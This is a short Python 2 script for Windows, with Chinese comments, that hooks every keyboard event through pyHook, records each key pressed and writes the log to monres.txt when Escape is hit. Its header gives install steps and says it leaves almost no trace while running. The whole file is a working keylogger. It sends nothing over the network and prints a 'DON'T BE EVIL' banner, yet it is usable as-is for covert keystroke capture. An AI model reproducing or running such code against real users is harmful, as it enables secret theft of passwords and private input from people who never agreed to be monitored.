# -*- coding: utf-8 -*- #
# modified from origin by oldj http://oldj.net/ #
'''
需要pyhook
for x86_64  
http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyhook下载pyHook-1.5.1-cp27-none-win_amd64.whl64位编译的py2.7版本运行的包。
解压后把pyhook文件夹放进C:\Python27\Lib\site-packages\pyHook
for x86
http://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/  安装很简单
脚本运行时除了一个cmd框外毫无痕迹，运行完后同目录下生成monres.txt文件
按ESC退出程序
ref:
http://www.cnblogs.com/6tian/p/5689142.html
https://blog.oldj.net/2010/07/14/python-hook/
'''
import pythoncom
import pyHook
import sys
flag = 0
res = ''


def onKeyboardEvent(event):
    global res
    key = event.Key
    if key == 'Escape':
        with open('monres.txt', 'w+') as f:
            f.write(res)
        sys.exit(0)
    res += key
    return True


def main():
    print """
    DON'T BE EVIL 
        made by findneo 
            2017/8/17 12:46
            
    请按ESC键退出 :D 
    """
    # 创建一个“钩子”管理对象
    hm = pyHook.HookManager()
    # 监听所有键盘事件
    hm.KeyDown = onKeyboardEvent
    # 设置键盘“钩子”
    hm.HookKeyboard()
    # 进入循环，如不手动关闭，程序将一直处于监听状态
    pythoncom.PumpMessages()

if __name__ == "__main__":
    main()
